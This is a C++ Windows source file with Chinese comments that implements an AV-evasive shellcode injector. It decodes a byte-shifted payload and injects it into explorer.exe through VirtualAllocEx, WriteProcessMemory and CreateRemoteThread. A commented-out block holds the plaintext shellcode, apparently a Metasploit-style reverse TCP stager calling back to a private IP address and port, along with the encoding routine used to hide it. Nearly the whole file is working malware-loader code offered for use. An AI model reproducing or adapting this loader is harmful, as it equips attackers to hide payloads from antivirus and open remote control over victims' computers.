#include <windows.h>
#include <tlhelp32.h>
#include <iomanip>
#include <iostream>
#include <string>

// 加密shellcode函数
void encrypt_shellcode(unsigned char* shellcode, size_t size) {
  // 简单加密
  for (size_t i = 0; i < size - 1; i++) {
    if (shellcode[i] == 0x00) {
      shellcode[i] += 0x05;
    } else {
      if ((shellcode[i] - 0x01) != 0x05) {
        shellcode[i] -= 0x01;
      }
    }
  }
  // 循环输出
  for (size_t i = 0; i < size - 1; i++) {
    std::cout << std::hex << "\\x" << std::setfill('0') << std::setw(2)
              << (unsigned int)(byte)shellcode[i];
  }
  std::cout << std::endl;
}

// 解密shellcode函数
void decrypt_shellcode(unsigned char* shellcode, size_t size) {
  // 解密shellcode
  for (size_t i = 0; i < size - 1 /*最后一位为\0所以无需解密*/; i++) {
    if (shellcode[i] == 0x05) {
      shellcode[i] = 0x00;
    } else {
      shellcode[i] += 0x01;
    }
  }
}

// 执行shellcode
bool run_shellcode(unsigned char* shellcode, size_t size) {
  typedef void(__cdecl * Func)();
  void* p = ::VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE,
                           PAGE_EXECUTE_READWRITE);
  if (p == NULL) return false;
  if (!memcpy(p, shellcode, size)) return false;
  Func code = (Func)p;
  code();
}

// 根据进程名搜索PID
const unsigned int GetProcessId(std::string process_name) {
  PROCESSENTRY32 pe32;
  HANDLE hProcSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hProcSnap == INVALID_HANDLE_VALUE) {
    return 0;
  }
  pe32.dwSize = sizeof(PROCESSENTRY32);
  // 遍历进程
  for (BOOL ret = Process32First(hProcSnap, &pe32); ret;
       ret = Process32Next(hProcSnap, &pe32)) {
    if (process_name == pe32.szExeFile) {
      CloseHandle(hProcSnap);
      return pe32.th32ProcessID;
    }
  }
  CloseHandle(hProcSnap);
  return 0;
}

bool InjectShellcode(const unsigned int pid, unsigned char* shellcode,
                     size_t size) {
  // 解密shellcode
  decrypt_shellcode(shellcode, size);
  HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  // 获取进程句柄失败
  if (hProcess == INVALID_HANDLE_VALUE) return false;
  auto inject_address =
      ::VirtualAllocEx(hProcess, NULL, sizeof(1000), MEM_COMMIT | MEM_RESERVE,
                       PAGE_EXECUTE_READWRITE);
  // VirtualAllocEx 失败
  if (inject_address == NULL) return false;
  // 远程写入shellcode
  ::WriteProcessMemory(hProcess, inject_address, (PVOID)shellcode, size + 1,
                       NULL);
  HANDLE hThread = ::CreateRemoteThread(
      hProcess, 0, 0, (LPTHREAD_START_ROUTINE)inject_address, NULL, 0, NULL);
  ::WaitForSingleObject(hThread, INFINITE);
  ::CloseHandle(hThread);
  ::VirtualFreeEx(hProcess, inject_address, 0, MEM_RELEASE);
  ::CloseHandle(hProcess);
  return true;
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
                   _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {
  unsigned char shellcode[] =
      "\xfb\x47\x82\xe3\xef\xe7\xcb\x05\x05\x05\x40\x50\x40\x4f\x51\x50"
      "\x55\x47\x30\xd1\x64\x47\x8a\x51\x5f\x47\x8a\x51\x17\x47\x8a\x51"
      "\x1f\x47\x8a\x71\x4f\x47\x0e\xb6\x49\x49\x4c\x30\xc8\x47\x30\xbf"
      "\xab\x3b\x60\x7b\x01\x2b\x1f\x40\xc0\xc8\x0c\x40\x00\xc0\xe1\xec"
      "\x51\x40\x50\x47\x8a\x51\x1f\x8a\x41\x3b\x47\x00\xcf\x65\x80\x77"
      "\x17\x0a\x01\x0e\x84\x71\x05\x05\x05\x8a\x7f\x87\x05\x05\x05\x47"
      "\x84\xbf\x73\x66\x47\x00\xcf\x4f\x8a\x47\x17\x43\x8a\x3f\x1f\x48"
      "\x00\xcf\xe2\x55\x47\xfe\xc8\x40\x8a\x33\x87\x47\x00\xd5\x4c\x30"
      "\xc8\x47\x30\xbf\xab\x40\xc0\xc8\x0c\x40\x00\xc0\x37\xdf\x74\xf0"
      "\x4b\x02\x4b\x23\x07\x44\x38\xd0\x74\xd7\x57\x43\x8a\x3f\x23\x48"
      "\x00\xcf\x65\x40\x8a\x0b\x47\x43\x8a\x3f\x1b\x48\x00\xcf\x40\x8a"
      "\x03\x87\x47\x00\xcf\x40\x57\x40\x57\x5d\x58\x59\x40\x57\x40\x58"
      "\x40\x59\x47\x82\xeb\x1f\x40\x51\xfe\xdf\x57\x40\x58\x59\x47\x8a"
      "\x11\xe8\x4a\xfe\xfe\xfe\x5c\x48\xbd\x76\x72\x31\x5e\x32\x31\x05"
      "\x05\x40\x55\x48\x88\xe5\x47\x80\xeb\x9f\x00\x05\x05\x48\x88\xe4"
      "\x48\xbb\x01\x05\x21\x8b\xbf\xa7\x00\x02\x40\x53\x48\x88\xe3\x4b"
      "\x88\xf0\x40\xb9\x4b\x76\x25\x06\xfe\xd4\x4b\x88\xe9\x67\x00\x00"
      "\x05\x05\x58\x40\xb9\x28\x7f\x6a\x05\xfe\xd4\x69\x09\x40\x5d\x4f"
      "\x4f\x4c\x30\xc8\x4c\x30\xbf\x47\xfe\xbf\x47\x88\xc1\x47\xfe\xbf"
      "\x47\x88\xc0\x40\xb9\xe9\x0e\xde\xdf\xfe\xd4\x47\x88\xc6\x69\x0f"
      "\x40\x57\x4b\x88\xe1\x47\x88\xf8\x40\xb9\x98\xa4\x73\x60\xfe\xd4"
      "\x84\xbf\x73\x09\x48\xfe\xcd\x74\xe4\xe7\x1e\x00\x05\x05\x47\x82"
      "\xeb\x0f\x47\x88\xe1\x4c\x30\xc8\x69\x03\x40\x57\x47\x88\xf8\x40"
      "\xb9\x01\xd8\xc7\x5e\xfe\xd4\x82\xf7\x05\x0e\x8d\x6c\x05\x05\x05"
      "\x47\x82\xc3\x1f\x5d\x88\xf5\x80\xf5\xea\xa6\x91\xd1\x4b\x8c\x9d"
      "\x05\x00\x05\x05\x69\x3f\x40\x58\x67\x05\x0f\x05\x05\x40\x57\x47"
      "\x88\xf1\x47\x30\xc8\x40\xb9\x57\xa3\x52\xe4\xfe\xd4\x47\x8c\x97"
      "\x05\x00\x05\x05\x48\x88\xde\x52\x55\x4f\x4c\x30\xc8\x48\x88\xef"
      "\x47\x88\xd9\x47\x88\xf8\x40\xb9\x01\xd8\xc7\x5e\xfe\xd4\x47\x82"
      "\xc3\x1f\x82\xf7\x05\x7c\x27\x57\x40\x56\x58\x67\x05\x3f\x05\x05"
      "\x40\x57\x69\x05\x59\x40\xb9\x0a\x2e\x0e\x2f\xfe\xd4\x56\x58\x40"
      "\xb9\x74\x6d\x4c\x60\xfe\xd4\x48\xfe\xcd\xe8\x1f\xfe\xfe\xfe\x47"
      "\x00\xc2\x47\x28\xc5\x74\xb2\x48\x88\xfd\x5e\x58\x40\x58\x40\x55"
      "\xe7\x0f\x05\x05\x05\x3b\x6f\xef\xc2\x66\x87\xbe\xf1\xc9\xd0\xc8"
      "\x5e\x78\x57\xeb\x47\x5d\x47\x30\xbf\x48\x88\xf7\xa9\xfd\xbf\x74"
      "\xfa\x47\x30\xda\x40\x01\x1b\x05\x47\x88\xc1\x7f\xe1\x0e\x01\x1b"
      "\x15\x40\x89\x13\x05\x40\x85\x13\x17\x40\x87\x13\x05\xfd\xbf\x74"
      "\xe2\x47\x30\xda\xfd\xbf\x40\x01\x1b\x05\x40\x89\x13\x05\x40\x85"
      "\x13\x17\x40\x87\x13\x05\x40\x01\x13\x17\x40\x89\x13\x0f\x40\x2f"
      "\x10\x48\xfe\xc0\x47\xfe\xc8\x74\xda\x5e\x40\xfe\xe6\x57\x69\x05"
      "\x58\x48\xc6\xc1\xef\xb4\xa1\x55\xfe\xd4";

  const unsigned int explorer_pid = GetProcessId("explorer.exe");

  InjectShellcode(explorer_pid, shellcode, sizeof(shellcode));

  return 0;
}

// int main() {
//   unsigned char shellcode[] =
//      "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
//      "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
//      "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
//      "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
//      "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
//      "\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
//      "\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b"
//      "\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
//      "\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1"
//      "\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
//      "\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
//      "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
//      "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
//      "\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
//      "\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00"
//      "\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
//      "\x49\xbc\x02\x00\x22\x8c\xc0\xa8\x01\x03\x41\x54\x49\x89\xe4"
//      "\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68"
//      "\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a"
//      "\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89"
//      "\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
//      "\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba"
//      "\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5"
//      "\xe8\x1f\x01\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9"
//      "\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5"
//      "\x83\xf8\x00\x0f\x8e\x6d\x00\x00\x00\x48\x83\xc4\x20\x5e\x89"
//      "\xf6\x81\xf6\xeb\xa7\x92\xd2\x4c\x8d\x9e\x00\x01\x00\x00\x6a"
//      "\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31"
//      "\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x8d\x98\x00\x01\x00"
//      "\x00\x49\x89\xdf\x53\x56\x50\x4d\x31\xc9\x49\x89\xf0\x48\x89"
//      "\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4"
//      "\x20\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00"
//      "\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59"
//      "\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x20\xff\xff"
//      "\xff\x48\x01\xc3\x48\x29\xc6\x75\xb3\x49\x89\xfe\x5f\x59\x41"
//      "\x59\x41\x56\xe8\x10\x00\x00\x00\x3c\x70\xf0\xc3\x67\x88\xbf"
//      "\xf2\xca\xd1\xc9\x5f\x79\x58\xec\x48\x5e\x48\x31\xc0\x49\x89"
//      "\xf8\xaa\xfe\xc0\x75\xfb\x48\x31\xdb\x41\x02\x1c\x00\x48\x89"
//      "\xc2\x80\xe2\x0f\x02\x1c\x16\x41\x8a\x14\x00\x41\x86\x14\x18"
//      "\x41\x88\x14\x00\xfe\xc0\x75\xe3\x48\x31\xdb\xfe\xc0\x41\x02"
//      "\x1c\x00\x41\x8a\x14\x00\x41\x86\x14\x18\x41\x88\x14\x00\x41"
//      "\x02\x14\x18\x41\x8a\x14\x10\x41\x30\x11\x49\xff\xc1\x48\xff"
//      "\xc9\x75\xdb\x5f\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0"
//      "\xb5\xa2\x56\xff\xd5";
//   encrypt_shellcode(shellcode, sizeof(shellcode));
//  // // 解密shellcode
//  //decrypt_shellcode(shellcode, sizeof(shellcode));
//  //typedef void(__cdecl * Func)();
//  //void* p = ::VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT |
//  MEM_RESERVE,
//  //                         PAGE_EXECUTE_READWRITE);
//  //// copy shellcode to p
//  //memcpy(p, shellcode, sizeof(shellcode));
//  //Func code = (Func)p;
//  //code();
//  //system("pause");
//  return 0;
//}
